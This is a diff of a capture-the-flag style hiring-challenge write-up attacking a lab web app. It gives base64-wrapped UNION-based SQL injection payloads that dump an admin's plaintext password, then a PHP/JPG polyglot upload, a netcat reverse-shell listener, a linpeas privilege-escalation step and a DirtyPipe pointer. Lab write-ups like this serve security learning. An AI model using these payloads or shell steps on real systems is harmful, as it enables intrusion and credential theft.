@@ -1,3 +1,6 @@
+# Saptang Labs Hiring Challenge
+
+---
 
 **Challenge Type** : _Blackbox Testing_
 
@@ -88,15 +91,19 @@ now we have some interesting directories like Admin and search_result.
 
 Admin page requires authentication Username and Password.
 
-http://192.168.1.21:42710/search_result/  
+[http://192.168.1.21:42710/search_result/](http://192.168.1.21:42710/search_result/)
 
 <img width="240" alt="image" src="https://user-images.githubusercontent.com/79740895/208960036-f154d56c-5bbf-4b35-8d97-b39dcf34c217.png">
 
-now this is something interesting there is link to http://192.168.1.21:42710/search_result/result_2022.php
+now this is something interesting there is link to 
+
+[http://192.168.1.21:42710/search_result/result_2022.php](http://192.168.1.21:42710/search_result/result_2022.php)
 
 <img width="544" alt="image" src="https://user-images.githubusercontent.com/79740895/208960308-7fa28195-3dc5-40ec-b877-5b1922e29dcf.png">
 
-_The Results of 2022 have not been published yet_ so let's try 2021 : http://192.168.1.21:42710/search_result/result_2021.php
+_The Results of 2022 have not been published yet_ so let's try 2021 : 
+
+[http://192.168.1.21:42710/search_result/result_2021.php](http://192.168.1.21:42710/search_result/result_2021.php)
 
 <img width="913" alt="image" src="https://user-images.githubusercontent.com/79740895/208960741-f610c650-98f4-40dd-87dd-5102f9e3e1ee.png">
 
@@ -108,7 +115,7 @@ on submitting the form we have this response:
 
 this POST request have `data=NjIxNzI5NTgx` it base64 encoded value of `621729581`.
 
-lets try with simple payload `' OR 1=1 #` but it not working after few tries i tried `621729581 OR 1=1` base64 encode and it gives us all the entries hooray,
+lets try with simple payload `' OR 1=1 #` but it is not working after few tries i tried `621729581 OR 1=1` base64 encode and it gives us all the entries hooray,
 and that is successful SQL injection.
 
 payload= `data=<@base64>621729581 OR 1=1<@/base64>`  <-- I'm using Hackvertor burp extension.
@@ -129,42 +136,44 @@ response:
 
 Now we can try to extract the databases'name, tables'name, columns'name.
 
-Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
+Reference: 
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
 
-payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,schema_name,0x7c), 2, 3 fRoM information_schema.schemata<@/base64>`
+payload: 
+```data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,schema_name,0x7c), 2, 3 fRoM information_schema.schemata<@/base64>```
 
 response:
 
-`|mysql|,|information_schema|,|performance_schema|,|sys|,|ezbox|`
+```|mysql|,|information_schema|,|performance_schema|,|sys|,|ezbox|```
 
 Now let's try to extract table name.
 
-payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,table_name,0x7c), 2, 3 fRoM information_schema.tables<@/base64>`
+payload: ```data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,table_name,0x7c), 2, 3 fRoM information_schema.tables<@/base64>```
 
 response:
 
-`|results|,|users|,|ADMINISTRABLE_ROLE_AUTHORIZATIONS|,|APPLICABLE_ROLES|,|CHARACTER_SETS|,|CHECK_CONSTRAINTS|,|COLLATIONS|,|COLLATION_CHARACTER_SET_APPLICABILITY|,|COLUMNS|,|COLUMNS_EXTENSIONS|,|COLUMN_PRIVILEGES|,|COLUMN_STATISTICS|,|ENABLED_ROLES|,|ENGINES|,|EVENTS|,|FILES|,|INNODB_BUFFER_PAGE|,|INNODB_BUFFER_PAGE_LRU|,|INNODB_BUFFER_POOL_STATS|,|INNODB_CACHED_INDEXES|,|INNODB_CMP|,|INNODB_CMPMEM|,|INNODB_CMPMEM_RESET|,|INNODB_CMP_PER_INDEX|,|INNODB_CMP_PER_INDEX_RESET|,|INNODB_CMP_RESET|,|INNODB_COLUMNS|,|INNODB_DATAFILES|,|INNODB_FIELDS|,|INNODB_FOREIGN|,|INNODB_FOREIGN_COLS|,|INNODB_FT_BEING_DELETED|,|INNODB_FT_CONFIG|,|INNODB_FT_DEFAULT_STOPWORD|,|INNODB_FT_DELETED|,|INNODB_FT_INDEX_CACHE|,|INNODB_FT_INDEX_TABLE|,|INNODB_INDEXES|,|INNODB_METRICS|,|INNODB_SESSION_TEMP_TABLESPACES|,|INNODB_TABLES|,|INNODB_TABLESPACES|,|INNODB_TABLESPACES_BRIEF|,|INNODB_TABLESTATS|,|INNODB_TEMP_TABLE_INFO|,|INNODB_TRX|,|INNODB_VIRTUAL|,|KEYWORDS|,|KEY_COLUMN_USAGE|,|OPTIMIZER_TRACE|,|PARAMETERS|,|PARTITIONS|,|PLUGINS|,|PRO`
+```|results|,|users|,|ADMINISTRABLE_ROLE_AUTHORIZATIONS|,|APPLICABLE_ROLES|,|CHARACTER_SETS|,|CHECK_CONSTRAINTS|,|COLLATIONS|,|COLLATION_CHARACTER_SET_APPLICABILITY|,|COLUMNS|,|COLUMNS_EXTENSIONS|,|COLUMN_PRIVILEGES|,|COLUMN_STATISTICS|,|ENABLED_ROLES|,|ENGINES|,|EVENTS|,|FILES|,|INNODB_BUFFER_PAGE|,|INNODB_BUFFER_PAGE_LRU|,|INNODB_BUFFER_POOL_STATS|,|INNODB_CACHED_INDEXES|,|INNODB_CMP|,|INNODB_CMPMEM|,|INNODB_CMPMEM_RESET|,|INNODB_CMP_PER_INDEX|,|INNODB_CMP_PER_INDEX_RESET|,|INNODB_CMP_RESET|,|INNODB_COLUMNS|,|INNODB_DATAFILES|,|INNODB_FIELDS|,|INNODB_FOREIGN|,|INNODB_FOREIGN_COLS|,|INNODB_FT_BEING_DELETED|,|INNODB_FT_CONFIG|,|INNODB_FT_DEFAULT_STOPWORD|,|INNODB_FT_DELETED|,|INNODB_FT_INDEX_CACHE|,|INNODB_FT_INDEX_TABLE|,|INNODB_INDEXES|,|INNODB_METRICS|,|INNODB_SESSION_TEMP_TABLESPACES|,|INNODB_TABLES|,|INNODB_TABLESPACES|,|INNODB_TABLESPACES_BRIEF|,|INNODB_TABLESTATS|,|INNODB_TEMP_TABLE_INFO|,|INNODB_TRX|,|INNODB_VIRTUAL|,|KEYWORDS|,|KEY_COLUMN_USAGE|,|OPTIMIZER_TRACE|,|PARAMETERS|,|PARTITIONS|,|PLUGINS|,|PRO```
 
 
 We have table with name `users` let's see the columns of this table.
 
-payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,column_name,0x7c), 2, 3 fRoM information_schema.columns wHeRe table_name="users"<@/base64>`
+payload: ```data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,column_name,0x7c), 2, 3 fRoM information_schema.columns wHeRe table_name="users"<@/base64>```
 
 response:
 
-`|id|,|password|,|profile_picture|,|username|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|,|USER|`
+```|id|,|password|,|profile_picture|,|username|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|,|USER|```
 
 We have username and password here what should we do extract them!
 
-payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,username,0x7c), 2, 3 fRoM users<@/base64>`
+payload: ```data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,username,0x7c), 2, 3 fRoM users<@/base64>```
 
-response: `|Admin|`
+response: ```|Admin|```
 
 username=Admin
 
-payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,password,0x7c), 2, 3 fRoM users<@/base64>`
+payload: ```data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,password,0x7c), 2, 3 fRoM users<@/base64>```
 
-response: `|zohl8meicohci9raw0|`
+response: ```|zohl8meicohci9raw0|```
 
 password=zohl8meicohci9raw0
 
@@ -200,19 +209,19 @@ We have to create polyglot PHP/JPG payload. how i do it is open jpg file and app
 
 we have column name profile_picture in users table, if you remember that we still have SQLi.
 
-payload=`data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,profile_picture,0x7c), 2, 3 fRoM users<@/base64>`
+payload=```data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,profile_picture,0x7c), 2, 3 fRoM users<@/base64>```
 
-result = `|../assets/uploads/simple.php|`
+result = ```|../assets/uploads/simple.php|```
 
 so our file is at http://192.168.1.21:42710/assets/uploads/simple.php
 
 <img width="759" alt="image" src="https://user-images.githubusercontent.com/79740895/208973100-2b05bb94-de13-42f2-bd9d-e6c978989c45.png">
 
-It works just fine let's get reverse shell. for reference: https://www.revshells.com/
+It works just fine let's get reverse shell. for reference: [https://www.revshells.com/](https://www.revshells.com/)
 
 [revshell.php](files/revshell.php)
 
-we start listener: `nc -lvnp 8888`
+we start listener: ```nc -lvnp 8888```
 
 and path= http://192.168.1.21:42710/assets/uploads/revshell.php
 
@@ -240,9 +249,9 @@ www-data@heathrow-VirtualBox:/$
 We have shell but we cat access /home/heathrow we need to escalate our privilege first thing that comes in mind is linpeas.sh 
 let's move that to victim machine i create local server with python `python -m http.server 80`, to transfer file because we normally don't have internet access in victim machine.
 
-change permissions to +x : `chmod +x linpeas.sh`
+change permissions to +x : ```chmod +x linpeas.sh```
 
-Now run the file: `./linpeas.sh`
+Now run the file: ```./linpeas.sh```
 
 Analyzing the output we have first suggestion for [CVE-2022-0847] DirtyPipe:
 
